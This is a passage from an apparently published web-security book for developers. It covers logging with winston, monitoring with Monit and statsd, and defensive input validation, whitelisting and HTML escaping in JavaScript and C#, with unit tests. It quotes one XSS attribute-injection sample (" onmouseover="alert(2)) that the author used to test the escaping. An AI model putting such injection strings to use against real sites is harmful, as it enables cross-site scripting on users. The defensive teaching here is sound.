       // Alternatively use winston.addColors(customColours); There are many ways
       // to do the same thing with winston
       colors: loggerConfig.colours,
       levels: loggerConfig.levels
    });

    // Add transports. There are plenty of options provided and you can add your own.

    logger.addConsole = function(config) {
       logger.add (winston.transports.Console, config);
       return this;
    };

    logger.addFile = function(config) {
       logger.add (winston.transports.File, config);
       return this;
    };

    logger.addPosixSyslog = function(config) {
       logger.add (winston.transports.SyslogPosix, config);
       return this;
    };

    logger.addEmail = function(config) {
       logger.add (winston.transports.Email, config);
       return this;
    };

    logger.emailLoggerFailure = function (err /*level, msg, meta*/) {
       // If called with an error, then only the err param is supplied.
       // If not called with an error, level, msg and meta are supplied.
       if (err) logger.alert(
          JSON.stringify(
             'error-code:' + err.code + '. '
             + 'error-message:' + err.message + '. '
             + 'error-response:' + err.response + '. logger-level:'
             + err.transport.level + '. transport:' + err.transport.name
          )
       );
    };

    logger.init = function () {
       if (loggerConfig.fileTransportOptions)
          logger.addFile( loggerConfig.fileTransportOptions );
       if (loggerConfig.consoleTransportOptions)
          logger.addConsole( loggerConfig.consoleTransportOptions );
       if (loggerConfig.syslogPosixTransportOptions)
          logger.addPosixSyslog( loggerConfig.syslogPosixTransportOptions );
       if (loggerConfig.emailTransportOptions)
          logger.addEmail( loggerConfig.emailTransportOptions );
    };

    module.exports = logger;
    module.exports.stream = {
       write: function (message, encoding) {      
          logger.info(message);
       }
    };

When the app first starts it initialises the logger on line 15 below.

{title="app.js", linenos=on, lang=JavaScript}
    var http = require('http');
    var express = require('express');
    var path = require('path');
    var morganLogger = require('morgan');
    // Due to bug in node-config the next line is needed before config
    // is required: https://github.com/lorenwest/node-config/issues/202
    if (process.env.NODE_ENV === 'production')
       process.env.NODE_CONFIG_DIR = path.join(__dirname, 'config');
    // Yes the following are hoisted, but it's OK in this situation.
    var logger = require('./util/logger'); // Or use requireFrom module so no relative paths.
    //...
    var errorHandler = require('errorhandler');
    var app = express();
    //...
    logger.init();
    app.set('port', process.env.PORT || 3000);
    app.set('views', __dirname + '/views');
    app.set('view engine', 'jade');
    //...
    // In order to utilise connect/express logger module in our third party logger,
    // Pipe the messages through.
    app.use(morganLogger('combined', {stream: logger.stream}));
    app.use(methodOverride());
    app.use(bodyParser.json());
    app.use(bodyParser.urlencoded({ extended: true }));
    app.use(express.static(path.join(__dirname, 'public')));
    //...
    require('./routes')(app);

    if ('development' == app.get('env')) {
       app.use(errorHandler({ dumpExceptions: true, showStack: true }));
       //...
    }
    if ('production' == app.get('env')) {
       app.use(errorHandler());
       //...
    }

    http.createServer(app).listen(app.get('port'), function(){
       logger.info(
          "Express server listening on port " + app.get('port') + ' in '
          + process.env.NODE_ENV + ' mode'
       );
    });

* You can also optionally log JSON metadata
* You can provide an optional callback to do any work required, which will be called once all transports have logged the specified message.

Here are some examples of how you can use the logger. The `logger.log(level` can be replaced with `logger.<level>(` where level is any of the levels defined in the `default.js` configuration file above:

{title="Anywhere you need logging", linenos=off, lang=JavaScript}
    // With string interpolation also.
    logger.log('info', 'test message %s', 'my string');
    logger.log('info', 'test message %d', 123);
    logger.log('info', 'test message %j', {aPropertyName: 'Some message details'}, {});
    logger.log(
       'info', 'test message %s, %s', 'first', 'second',
       {aPropertyName: 'Some message details'}
    );
    logger.log(
       'info', 'test message', 'first', 'second', {aPropertyName: 'Some message details'}
    );
    logger.log(
       'info', 'test message %s, %s', 'first', 'second',
       {aPropertyName: 'Some message details'}, logger.emailLoggerFailure
    );
    logger.log(
       'info', 'test message', 'first', 'second',
       {aPropertyName: 'Some message details'}, logger.emailLoggerFailure
    );

As an architectural concern, also consider hiding cross cutting concerns like logging using Aspect Oriented Programming (AOP).

#### Insufficient Monitoring
![](images/ThreatTags/PreventionEASY.png)

There are a couple of ways of approaching monitoring:

1. Only when you want to see and be notified when the state of your application is unhealthy (sometimes called the dark cockpit approach)
2. Regardless of state, healthy or unhealthy

Personally I like to have both options.

##### Dark Cockpit

As discussed in the VPS chapter, Monit is an excellent tool to use for the dark cockpit approach, as it is easy to configure. Monit has short [documentation](https://mmonit.com/monit/documentation/monit.html) which is easy to read and simple to understand. Their configuration file has lots of examples commented out ready for you to take and modify to suite your environment. I provided examples of monitoring a VPS and [NodeJS web application](#vps-countermeasures-lack-of-visibility-proactive-monitoring-keep-nodejs-application-alive) in the VPS chapter. When I have used Monit myself I have had excellent success with it. Go back to the VPS chapter [Monitoring section](#vps-countermeasures-lack-of-visibility-proactive-monitoring-monit) for a refresher as Monit doesn't just give you monitoring, it can also perform pre-defined actions based on current states of many VPS resources and their applications.

##### Statistics Graphing {#web-applications-countermeasures-lack-of-visibility-insufficient-Monitoring-statistics-graphing}

In the [Statistics Graphing](#vps-countermeasures-lack-of-visibility-statistics-graphing) section in the VPS chapter, we look at adding [statsd](https://github.com/etsy/statsd/) as the application instrumentation to our existing collectd -> graphite setup.

Just as collectd can collect and send data to graphite directly, if the collectd agent and server are on the same machine, or indirectly via a collectd server on another machine to provide continual system visibility, statsd can play a role similar to collectd agent/server, but for our applications. 

Statsd is a lightweight NodeJS daemon that collects and stores the statistics sent to it for a configurable amount of time (10 seconds by default). It does this by listening for UDP packets containing the statistics. Statsd then aggregates the statistics and flushes a single value for each statistic to its [`backends`](https://github.com/etsy/statsd/blob/8d5363cb109cc6363661a1d5813e0b96787c4411/exampleConfig.js#L125) (graphite in our case) using a TCP connection. The [`flushInterval`](https://github.com/etsy/statsd/blob/8d5363cb109cc6363661a1d5813e0b96787c4411/exampleConfig.js#L50) needs to be the same as the `retentions` interval in the Carbon [`/etc/carbon/storage-schemas.conf`](https://graphite.readthedocs.io/en/latest/config-carbon.html#storage-schemas-conf) file. This is how statsd [gets around](https://www.digitalocean.com/community/tutorials/how-to-configure-statsd-to-collect-arbitrary-stats-for-graphite-on-ubuntu-14-04#anatomy-of-statsd-data-metrics) the Carbon limitation by only accepting a single value per interval. The protocol that statsd expects to receive looks like the following, expecting a type in the third position instead of the timestamp that [Carbon expects](#vps-countermeasures-lack-of-visibility-statistics-graphing-assembling-the-components-after):

{title="statsd receiving protocol (syntax)", linenos=off}
    <metric-name>:<actual-value>|<type>

Where `<type>` is one of the following:

{title="Count", linenos=off}
    c

This tells statsd to add up all the values it receives for a particular statistic during the flush interval and sends the total on flush. A sample rate can also be provided from the statsd client as a decimal of the number of samples per event count:  
`<metric-name>:<actual-value>|c[|@<sample-rate>]`  
So if the statistic is [only being sampled 1/10th of the time](https://github.com/etsy/statsd/blob/master/docs/metric_types.md#sampling):  
`<metric-name>:<actual-value>|c|@0.1`  

{title="Timing", linenos=off}
    ms

This value needs to be the timespan, in milliseconds, between a start and end time. This could be, for example, the timespan that it took to hash a piece of data to be stored such as a password, or how long it took to pre-render an isomorphic web view. Just as with the count type, you can also provide a sample rate for timing as well. Statsd does quite a lot of work with timing data, it [works out](https://github.com/etsy/statsd/blob/master/docs/metric_types.md#timing) percentiles, mean, standard deviation, sum, lower and upper bounds for the flush interval. This can be very useful when you are making changes to your application and want to know if any changes are [slowing it down](https://www.digitalocean.com/community/tutorials/how-to-configure-statsd-to-collect-arbitrary-stats-for-graphite-on-ubuntu-14-04#timers).

{title="Gauges", linenos=off}
    g

A gauge is a snapshot of a reading in your application code, like your [car's fuel gauge](https://github.com/b/statsd_spec/blob/master/README.md#gauges), as opposed to the count type which is calculated by statsd, a gauge is calculated at the statsd client.

{title="Sets", linenos=off}
    s

[Sets](https://www.digitalocean.com/community/tutorials/how-to-configure-statsd-to-collect-arbitrary-stats-for-graphite-on-ubuntu-14-04#sets) allows you to send the number of [unique occurrences](https://github.com/etsy/statsd/blob/master/docs/metric_types.md#sets) of events between flushes. Therefore, you could send the source address of every request to your web application and statsd would work out the number of unique source requests per flush interval.

For example, if you have statsd running on a server called graphing-server with the default port, you can test this by sending a count metric with the following command:

{title="statsd receiving protocol (example)", linenos=off}
    echo "<meteric-name>:<actual-value>|c" | nc -u -w0 graphing-server 8125

The server and port are specified in the config file that you create. This can be created from the [`exampleConfig.js`](https://github.com/etsy/statsd/blob/8d5363cb109cc6363661a1d5813e0b96787c4411/exampleConfig.js) as a starting point. In `exampleConfig.js` you will see the server and port properties. The current options for server are TCP or UDP, with UDP being the default. The server file must exist in the [`./servers/`](https://github.com/etsy/statsd/tree/master/servers) directory.

One of the ways we can generate statistics to send to our listening statsd daemon is by using one of the many language specific [statsd clients](https://github.com/etsy/statsd/wiki#client-implementations), which makes it trivially easy to collect and send application statistics via a single routine call.

![](images/statsd-graphite.png)

### Lack of Input Validation, Filtering and Sanitisation {#web-applications-countermeasures-lack-of-input-validation-filtering-and-sanitisation}
![](images/ThreatTags/PreventionAVERAGE.png)

#### Generic {#web-applications-countermeasures-lack-of-input-validation-filtering-and-sanitisation-generic}

Do what ever you can to help establish clean lines of separation between concerns in terms of both domain and technology, and keep everything as simple as possible. It will then be harder for defects and malicious code to hide.

Your staple practises, when it comes to defending against potentially dangerous input, should be validation and filtering. There will be cases though when the business requires that input must be accepted that is dangerous yet still valid. At this point, you will need to implement sanitisation. There is a lot more research and thought involved when you need to perform sanitisation. Therefore, the first course of action should be to confirm that the specific dangerous-yet-valid input is, in fact, essential.

**Recommendations:**

Research:

* Libraries
* The [execution contexts](#web-applications-identify-risks-lack-of-input-validation-filtering-and-sanitisation-generic-what-is-sanitisation) that your data will flow through and/or be placed in
* Which character signatures need to be sanitised

Attempt to use well tested, battle hardened language-specific libraries that properly validate, filter and sanitise.

Create enough "Evil Test Conditions" as discussed in the Process and Practises chapter of [Fascicle 0](https://f0.holisticinfosecforwebdevelopers.com) to verify that:

* **Validation**
  * Only white listed characters can be received (both client and server side)
  * Maximum and minimum field lengths are enforced
  * Constrain fields to well structured data, such as: credit card numbers, dates, social security numbers, area codes, e-mail addresses, etc. The more you can define and constrain the types of data that is permitted in any given field, the easier it is to apply a white list and validate effectively.  
    
    WebComponents have come a long way and I think are perfect for this task.  
    
    With WebComponents, you get to create your own custom elements in an HTML tag. The browser will understand these natively, so they will work with any framework or library that you are using. In order to define your own custom element, the tag name you define must be all lower case and must contain at least one hyphen used for separating namespaces. No elements will be added to HTML, SVG or MathML that contain hyphens.  
    
    Each [Custom Element](https://w3c.github.io/webcomponents/spec/custom/) (`my-password` for example) has a corresponding [HTML Import](https://w3c.github.io/webcomponents/spec/imports/) (`my-password.html` for example) that provides the [definition of the Custom Element](https://www.polymer-project.org/1.0/docs/devguide/quick-tour), behaviour (JavaScript), DOM structure, and styling. Nothing in the Custom Elements HTML Import can leak, it is a component and encapsulated. Styles can also not permeate. As our applications continue to grow, Custom Elements are a great tool for modularising concerns.  
    
    Custom Elements are currently only natively supported in Chrome and Opera, but we have the [webcomponents.js set of polyfills](http://webcomponents.org/polyfills/) which means we can all use WebComponents.  
    
    Polymer is a library that helps you write WebComponents and mediates with the browser on your behalf, it also polyfills.  
    
    Custom Element authors can also expose [Custom CSS properties](https://www.polymer-project.org/1.0/docs/devguide/styling#custom-css-properties) that they think consumers may want to apply values to, these styles are prefixed with `--` and are essentially an interface to a backing (CSS property) field, which would otherwise be inaccessible.  
    
    The Custom Element author can also decide to define a set of CSS properties as a single Custom CSS property, called a [Custom CSS mixin](https://www.polymer-project.org/1.0/docs/devguide/styling#custom-css-mixins), and then allow all of the properties within the set to be applied to a specific CSS rule in an elements local DOM. This is done using the [CSS @apply rule](https://tabatkins.github.io/specs/css-apply-rule/). This allows consumers to mix in any styles within the single Custom CSS property, but only intentionally by using the `--` prefix.  
    
    Polymer also has a large [collection of Custom Elements](https://elements.polymer-project.org/) already created for you out of the box. Some of these Custom Elements are perfect for constraining and providing validation and filtering of input types, [credit card details](https://elements.polymer-project.org/browse?package=gold-elements) for example.  
    
    
  * You have read, understood and implemented [Validation](#web-applications-identify-risks-lack-of-input-validation-filtering-and-sanitisation-generic-what-is-validation) as per Identify Risks section
* **Filtering**
  * Your filtering routines are doing as expected with valid and non-valid input (both client and server side)
  * You have read, understood, and implemented [Filtering](#web-applications-identify-risks-lack-of-input-validation-filtering-and-sanitisation-generic-what-is-filtering) as per Identify Risks section
* **Sanitisation**
  * All valid characters that need modification are modified. Modifying could simply be a case of rounding a float down (removing precision), or changing the case of an alpha character, which is not usually a security issue
  * Sanitising or transforming the character signatures known to be dangerous in the [execution contexts](#web-applications-identify-risks-lack-of-input-validation-filtering-and-sanitisation-generic-what-is-sanitisation) you have discovered in your code that character signatures pass through / are placed in and are transformed into their safe counterparts. If your libraries cover all cases which, in my experience, I have not seen yet, is great, but often there will be edge cases that stop the libraries being useful in every case. I provide an example of this below where the available libraries did not cover the edge cases I had in a project I worked on a few years ago. When this happens, you may need to create some sanitisation logic. At this point, you are really going to have to gain good understanding of the execution contexts that will affect you and the different types of escaping you need to know about.
  * You have read, understood and implemented [Sanitisation](#web-applications-identify-risks-lack-of-input-validation-filtering-and-sanitisation-generic-what-is-sanitisation) as per Identify Risks section

##### Types of Escaping: {#web-applications-countermeasures-lack-of-input-validation-filtering-and-sanitisation-generic-types-of-escaping}

Escaping is a technique used to sanitise. Escaped data will still render in the browser properly. Escaping simply lets the interpreter know that the data is not intended to be executed, preventing the attack.

There are numerous types of escaping you may need to know about depending on where you intend on inserting untrusted data. Work through the following set of rules in this order:

1. HTML Escape
2. Attribute Escape
3. JavaScript Escape. Including HTML Escape JSON values in HTML context
4. CSS Escape
5. URL Escape
6. Sanitise HTML
7. Prevent DOM-based XSS

The OWASP [XSS (Cross Site Scripting) Prevention Cheat Sheet](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet#XSS_Prevention_Rules) covers these points in more depth. **Familiarise yourself with the rules before completing any custom sanitisation work**.

##### Example in JavaScript and C\# {#web-applications-countermeasures-lack-of-input-validation-filtering-and-sanitisation-generic-example-in-javascript-and-csharp}

A>
A> When out-of-the-box libraries do not cover all of your sanitisation needs.
A>

The following example is taken from a project I worked on a few years ago.

Client side validation, filtering, and sanitisation is more about UX (User Experience), more about helping the honest user save round trip communications to the server than stopping an attacker as an attacker will simply bypass any client side defences.

We needed to apply a whitelist to all characters being entered into the `value` attribute of `input` elements of `type="text"` also `textarea` elements. The requirement was that the enduser could not insert invalid characters into one of these fields. By insert we mean:

1. type the characters in
2. [ctrl]+[v] a clipboard full of characters in
3. right click -> Paste

The following was the strategy that evolved. Performance was measured, and even with an interval much lower than the 300 milliseconds, the performance impact was negligible. As soon as any non-whitelist character(s) were entered, they were immediately deleted within 300 milliseconds.

`$` references jQuery.

{title="Validation using white list", linenos=off, lang=JavaScript}
    var userInputValidationIntervalId = 0;

    setupUserInputValidation = function () {

       var textAreaMaxLength = 400;
       var elementsToValidate;
       var whiteList = /[^A-Za-z_0-9\s.,]/g;

       var elementValue = {
          textarea: '',
          textareaChanged: function (obj) {
             var initialValue = obj.value;
             var replacedValue = initialValue.
                replace(whiteList, "").
                slice(0, textAreaMaxLength);
             if (replacedValue !== initialValue) {
                this.textarea = replacedValue;
                return true;
             }
             return false;
          },
          inputtext: '',
          inputtextChanged: function (obj) {
             var initialValue = obj.value;
             var replacedValue = initialValue.replace(whiteList, "");
             if (replacedValue !== initialValue) {
                this.inputtext = replacedValue;
                return true;
             }
             return false;
          }
       };

       elementsToValidate = {
          textareainputelements: (function () {
             var elements = $('#page' + currentPage).find('textarea');
             if (elements.length > 0) {
                return elements;
             }
             return 'no elements found';
          } ()),
          textInputElements: (function () {
             var elements = $('#page' + currentPage).find('input[type=text]');
             if (elements.length > 0) {
                return elements;
             }
             return 'no elements found';
          } ())
       };

       // store the intervals id in outer scope
       // so we can clear the interval when we change pages.
       userInputValidationIntervalId = setInterval(function () {
          var element;

          // Iterate through each one and remove any characters not in the whitelist.
          // Iterate through each one and trim any that are longer than 400.

          for (element in elementsToValidate) {
             if (elementsToValidate.hasOwnProperty(element)) {
                elementsToValidate
                if (elementsToValidate[element] === 'no elements found')
                   continue;

                $.each(elementsToValidate[element], function () {
                   $(this).attr('value', function () {
                      var name = $(this).prop('tagName').toLowerCase();
                      name = name === 'input' ? name + $(this).prop('type') : name;
                      if (elementValue[name + 'Changed'](this))
                         this.value = elementValue[name];
                   });
                });
             }
          }
       }, 300); // Milliseconds.
    };

Each time we changed the page, we cleared the interval, and reset it for the new page.

{linenos=off, lang=JavaScript}
    clearInterval(userInputValidationIntervalId);
    setupUserInputValidation();

HTML5 provides the `pattern` attribute on the `input` tag, which allows us to specify a regular expression that the text received is checked against, although this does not apply to `textarea`s. Also, when validation occurs is not specified in the [HTML specification](https://html.spec.whatwg.org/multipage/forms.html#the-pattern-attribute), there may not be enough control provided.

Here we extend the `String` prototype with a function called `htmlEscape`.


{id="sanitisation-using-escaping", title="Sanitisation using escaping", linenos=off, lang=JavaScript}
    if (typeof Function.prototype.method !== "function") {
       Function.prototype.method = function (name, func) {
          this.prototype[name] = func;
          return this;
       };
    }
    
    String.method('htmlEscape', function () {
    
       // Escape the following characters with HTML entity encoding
       // to prevent switching into any execution context,
       // such as script, style, or event handlers.
       // Using hex entities is recommended in the spec.
       // In addition to the 5 characters significant in XML (&, <, >, ", '),
       // the forward slash is included as it helps to end an HTML entity.
       var character = {
          '&': '&amp;',
          '<': '&lt;',
          '>': '&gt;',
          '"': '&quot;',
          // Double escape character entity references. Why?
          // The XmlTextReader that is setup in XmlDocument.LoadXml on the service considers
          // the character entity references (&#xxxx;) to be the character they represent.
          // All XML is converted to unicode on reading and any such entities are
          // removed in favour of the unicode character they represent.
          // So we double escape character entity references.
          // These now get read to the XmlDocument and saved to the database as
          // double encoded Html entities.
          // Now when these values are pulled from the database and sent to the browser,
          // it decodes the & and displays #x27; and/or #x2F.
          // This isn't what we want to see in the browser, so on the way out,
          // we use the below SingleDecodeDoubleEncodedHtml extension method.
          "'": '&amp;#x27;',    // &apos; is not recommended
          '/': '&amp;#x2F;'     // forward slash is included as it helps end an HTML entity
       };
    
       return function () {
          return this.replace(/[&<>"'/]/g, function (c) {
             return character[c];
          });
       };
    }());

Just before any user input was sent back to the server, we checked each of the fields that were receiving input from by doing the following:

{linenos=off, lang=JavaScript}
    element.value.htmlEscape();

"_HTML entity encoding is okay for untrusted data that you put in the body of the HTML document, such as inside a `<div>` tag. It even partially works for untrusted data that goes into attributes, particularly if you're religious about using quotes around your attributes._"

> OWASP XSS Prevention Cheat Sheet

For us, this would be enough, as we are `HTML` escaping our `textarea` elements and are happy to make sure we are religious about using quotes around the `value` attribute on `input` of `type="text"`.

"_But HTML entity encoding doesn't work if you're putting untrusted data inside a `<script>` tag anywhere, or an event handler attribute like `onmouseover`, or inside CSS, or in a URL. Even if you use an HTML entity encoding method everywhere, you are still most likely vulnerable to XSS. You MUST use the escape syntax for the part of the HTML document you're putting untrusted data into._" 

> OWASP XSS Prevention Cheat Sheet

The escaping rules discussed [above](#web-applications-countermeasures-lack-of-input-validation-filtering-and-sanitisation-generic-types-of-escaping) detail this. Check out the [OWASP resource](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet#Why_Can.27t_I_Just_HTML_Entity_Encode_Untrusted_Data.3F) for full details.

Rule #2 of the OWASP XSS Prevention Cheat Sheet discusses attribute escaping. As we were only using `value` attributes, we had the luxury of being able to control the fact that we would always be using properly quoted attributes. We didn't have to take this extra step of escaping all (other than alphanumeric) ASCII characters, that is values less than 256 with the `&#xHH` format to prevent switching out of the attribute context.

I wanted to be certain about not being able to escape out of the attribute's context if it was properly quoted when I tested it. To do this, I created a collection of injection attacks, none of which worked. If you enter something such as the following into the attribute `value` of an `input` element where `type="text"`, then the first double quote will be interpreted as the corresponding quote and the end double quote will be interpreted as the end quote of the `onmouseover` attribute value.

{linenos=off, lang=JavaScript}
    " onmouseover="alert(2)

All the legitimate double quotes are interpreted as the double quote `HTML` entity `"` and all illegitimate double quotes are interpreted as the character value. This is what you end up with:

{linenos=off, lang=JavaScript}
    value=" &quot; onmouseover=&quot;alert(2)"

Now, in regards to the code comments in the block of code above titled "Sanitisation using escaping", I mentioned having to double escape character references. We were using `XSL` for the `HTML` because we needed to perform transformations before delivering to the browser. Because we were sending the strings to the browser, it was easier to single decode the double encoded `HTML` on the service side only. As we were still focussed on the client side sanitisation and would soon shift our focus to cover the server side, we knew we were going to have to create some sanitisation routines for our .NET service. Because the routines were likely to be static, we were just dealing with strings, where we created an extensions class in a new project for a common library we already had. This provided the widest use from our sanitisation routines, while allowing us to wrap any existing libraries, or parts of them that we wanted to use.

{title="Common.Security.Encoding.Extensions.SingleDecodeDoubleEncodedHtml", linenos=off, lang=C#}
    namespace Common.Security.Encoding {
       /// <summary>
       /// Provides a series of extension methods that perform sanitisation.
       /// Escaping, unescaping, etc.
       /// Usually targeted at user input, to help defend against the likes of XSS attacks.
       /// </summary>
       public static class Extensions {
          /// <summary>
          /// Returns a new string in which all occurrences of a double escaped html character
          /// (that's an html entity immediatly prefixed with another html entity)
          /// in the current instance are replaced with the single escaped character.
          /// </summary>
          /// <param name="source"></param>
          /// <returns>The new string.</returns>
          public static string SingleDecodeDoubleEncodedHtml(this string source) {
             return source.Replace("&amp;#x", "&#x");
          }
       }
    }

Now, when we ran our `xslt` transformation on the service, we chained our new extension method on the end. This gave us back a single encoded string that the browser was happy to display as the decoded value.

{linenos=off, lang=C#}
    return Transform().SingleDecodeDoubleEncodedHtml();

Turning our attention to the server side, untrusted data (data entered by a user), should always be treated as if it may contain attack code.
This data should not be sent anywhere without taking the necessary steps to detect and neutralise the malicious code, depending on which [execution contexts](#web-applications-identify-risks-lack-of-input-validation-filtering-and-sanitisation-generic-what-is-sanitisation) it will pass through.

With applications becoming more interconnected, attacks that are being buried in user input and decoded and/or executed by a downstream interpreter are common. Input validation that restricts user input to allow only certain white listed characters and restricts field lengths represents only two forms of defence. Any decent attacker can get around client side validation, so you will need to employ defence in depth. If you need to validate, filter and sanitise, at the very least, it will need to be done on the server side.

I found `System.Net.WebUtility` from the `System.Web.dll` assembly to do most of what we needed other than provide us with fine grained information specific to tampering, and I extended it slightly. I had not employed AOP at this stage, so there was some copy paste modifying done.

First up, the exceptions we used:

{title="Common.WcfHelpers.ErrorHandling.Exceptions.WcfException", linenos=off, lang=C#}
    namespace Common.WcfHelpers.ErrorHandling.Exceptions {
       public abstract class WcfException : Exception {
          /// <summary>
          /// In order to set the message for the client, set it here,
          /// or via the property directly in order to over ride default value.
          /// </summary>
          /// <param name="message">
          /// The message to be assigned to the Exception's Message.
          /// </param>
          /// <param name="innerException">
          /// The exception to be assigned to the Exception's InnerException.
          /// </param>
          /// <param name="messageForClient">
          /// The client friendly message. This parameter is optional, but should be set.
          /// </param>
          public WcfException(
             string message, Exception innerException = null, string messageForClient = null
          ) : base(message, innerException) {
             MessageForClient = messageForClient;
          }

          /// <summary>
          /// This is the message that the services client will see.
          /// Make sure it is set in the constructor. Or here.
          /// </summary>
          public string MessageForClient {
             get {
                return string.IsNullOrEmpty(_messageForClient) ?
                   "The MessageForClient property of WcfException was not set" :
                   _messageForClient;
             }
             set { _messageForClient = value; }
          }
          private string _messageForClient;
       }
    }

And the more specific `SanitisationWcfException`:

{title="Common.WcfHelpers.ErrorHandling.Exceptions.SanitisationWcfException", linenos=off, lang=C#}
    using System;
    using System.Configuration;
    
    namespace Common.WcfHelpers.ErrorHandling.Exceptions {
       /// <summary>
       /// Exception class that is used when the user input sanitisation fails,
       /// and the user needs to be informed.
       /// </summary>
       public class SanitisationWcfException : WcfException {
          private const string _defaultMessageForClient =
             "Answers were NOT saved. User input validation was unsuccessful.";
          public string UnsanitisedAnswer { get; private set; }
 
          /// <summary>
          /// In order to set the message for the client, set it here,
          /// or via the property directly in order to over ride default value.
          /// </summary>
          /// <param name="message">
          /// The message to be assigned to the Exception's Message.
          /// </param>
          /// <param name="innerException">
          /// The Exception to be assigned to the base class instance's inner exception.
          /// This parameter is optional.
          /// </param>
          /// <param name="messageForClient">
          /// The client friendly message. This parameter is optional, but should be set.
          /// </param>
          /// <param name="unsanitisedAnswer">
          /// The user input string before service side sanitisatioin is performed.
          /// </param>
          public SanitisationWcfException (
             string message,
             Exception innerException = null,
             string messageForClient = _defaultMessageForClient,
             string unsanitisedAnswer = null
          ) : base (
             message,
             innerException,
             messageForClient +
             " If this continues to happen, please contact " +
             ConfigurationManager.AppSettings["SupportEmail"] + Environment.NewLine
          ) {
             UnsanitisedAnswer = unsanitisedAnswer;
          }
       }
    }

Now we defined whether our requirements were satisfied by way of executable requirements (unit tests(in their rawest form)):

{title="Common.Security.Encoding.UnitTest.ExtensionsTest", linenos=off, lang=C#}
    using NUnit.Framework;
    using Common.Security.Sanitisation;
    
    namespace Common.Security.Encoding.UnitTest {
       [TestFixture]
       public class ExtensionsTest {
    
          private readonly string _inNeedOfEscaping =
             @"One #x2F / two amp & three #x27 ' four lt < five quot "" six gt >.";
          private readonly string _noNeedForEscaping =
             @"One x2F two amp three x27 four lt five quot six gt       .";
          
          [Test]
          public void SingleDecodeDoubleEncodedHtml_ShouldSingleDecodeDoubleEncodedHtml() {
             string doubleEncodedHtml = @" &amp;#x27; some text &amp;#x2F; ";
             string singleEncodedHtmlShouldLookLike = @" &#x27; some text &#x2F; ";
             string singleEncodedHtml = doubleEncodedHtml.SingleDecodeDoubleEncodedHtml();
             Assert.That(singleEncodedHtml, Is.EqualTo(singleEncodedHtmlShouldLookLike));
          }
 
          [Test]
          public void Extensions_CompliesWithWhitelist_ShouldNotComply() {
             Assert.That(
                _inNeedOfEscaping.CompliesWithWhitelist(whiteList: @"^[\w\s\.,]+$"),
                Is.False
             );
          }
 
          [Test]
          public void Extensions_CompliesWithWhitelist_ShouldComply() {
             Assert.That(
                _noNeedForEscaping.CompliesWithWhitelist(whiteList: @"^[\w\s\.,]+$"),
                Is.True
             );
             Assert.That(
                _inNeedOfEscaping.CompliesWithWhitelist(whiteList: @"^[\w\s\.,#/&'<"">]+$"),
                Is.True
             );
          }
       }
    }

Now the code that satisfies the above executable specifications, and more:

{title="Common.Security.Sanitisation.Extensions", linenos=on, lang=C#}
    using System;
    using System.Collections.Generic;
    using System.Globalization;
    using System.IO;
    using System.Text.RegularExpressions;
    
    namespace Common.Security.Sanitisation {
       /// <summary>
       /// Provides a series of extension methods that perform sanitisation.
       /// Escaping, unescaping, etc.
       /// Usually targeted at user input,
       /// to help defend against the likes of XSS and other injection attacks.
       /// </summary>
       public static class Extensions {
       
          private const int CharacterIndexNotFound = -1;
       
          /// <summary>
          /// Returns a new string in which all occurrences of a double escaped html character
          /// (that's an html entity immediatly prefixed with another html entity)
          /// in the current instance are replaced with the single escaped character.
          /// </summary>
          /// <param name="source">
          /// The target text used to strip one layer of Html entity encoding.
          /// </param>
          /// <returns>The singly escaped text.</returns>
          public static string SingleDecodeDoubleEncodedHtml(this string source) {
             return source.Replace("&amp;#x", "&#x");
          }

          /// <summary>
          /// Filter a text against a regular expression whitelist of specified characters.
          /// </summary>
          /// <param name="target">The text that is filtered using the whitelist.</param>
          /// <param name="alternativeTarget"></param>
          /// <param name="whiteList">
          /// Needs to be be assigned a valid whitelist, otherwise nothing gets through.
          /// </param>
          public static bool CompliesWithWhitelist(
             this string target, string alternativeTarget = "", string whiteList = ""
          ) {
             if (string.IsNullOrEmpty(target))
                target = alternativeTarget;
     
             return Regex.IsMatch(target, whiteList);
          }

          // Warning!
          // The following code is not pretty, it came from System.Net.WebUtility.

          /// <summary>
          /// Takes a string and returns another with a single layer of
          /// Html entity encoding replaced with it's Html entity literals.
          /// </summary>
          /// <param name="encodedUserInput">
          /// The text to perform the opperation on.
          /// </param>
          /// <param name="numberOfEscapes">
          /// The number of Html entity encodings that were replaced.
          /// </param>
          /// <returns>
          /// The text that's had a single layer of Html entity encoding
          /// replaced with it's Html entity literals.
          /// </returns>
          public static string HtmlDecode(
             this string encodedUserInput, ref int numberOfEscapes
          ) {
             const int NotFound = -1;
          
             if (string.IsNullOrEmpty(encodedUserInput))
                return string.Empty;
       
             StringWriter output = new StringWriter(CultureInfo.InvariantCulture);
          
             if (encodedUserInput.IndexOf('&') == NotFound) {
                output.Write(encodedUserInput);
             } else {
                int length = encodedUserInput.Length;
                for (int index1 = 0; index1 < length; ++index1) {
                   char ch1 = encodedUserInput[index1];
                   if (ch1 == 38) {
                      int index2 = encodedUserInput.IndexOfAny(
                         _htmlEntityEndingChars, index1 + 1
                      );
                      if (index2 > 0 && encodedUserInput[index2] == 59) {
                         string entity = encodedUserInput.Substring(
                            index1 + 1, index2 - index1 - 1
                         );
                         if (entity.Length > 1 && entity[0] == 35) {
                            ushort result;
                            if (entity[1] == 120 || entity[1] == 88)
                               ushort.TryParse(
                                  entity.Substring(2),
                                  NumberStyles.AllowHexSpecifier,
                                  NumberFormatInfo.InvariantInfo,
                                  out result
                               );
                            else
                               ushort.TryParse(
                                  entity.Substring(1),
                                  NumberStyles.AllowLeadingWhite |
                                  NumberStyles.AllowTrailingWhite |
                                  NumberStyles.AllowLeadingSign,
                                  NumberFormatInfo.InvariantInfo,
                                  out result
                               );
                            if (result != 0) {
                               ch1 = (char)result;
                               numberOfEscapes++;
                               index1 = index2;
                            }
                         } else {
                            index1 = index2;
                            char ch2 = HtmlEntities.Lookup(entity);
                            if ((int)ch2 != 0) {
                               ch1 = ch2;
                               numberOfEscapes++;
                            } else {
                               output.Write('&');
                               output.Write(entity);
                               output.Write(';');
                               continue;
                            }
                         }
                      }
                   }
                   output.Write(ch1);
                }
             }
             string decodedHtml = output.ToString();
             output.Dispose();
             return decodedHtml;
          }

          /// <summary>
          /// Escapes all character entity references (double escaping where necessary).
          /// Why? The XmlTextReader that is setup in XmlDocument.LoadXml on the service
          /// considers the character entity references (&#xxxx;)
          /// to be the character they represent.
          /// All XML is converted to unicode on reading and any such entities are removed
          /// in favor of the unicode character they represent.
          /// </summary>
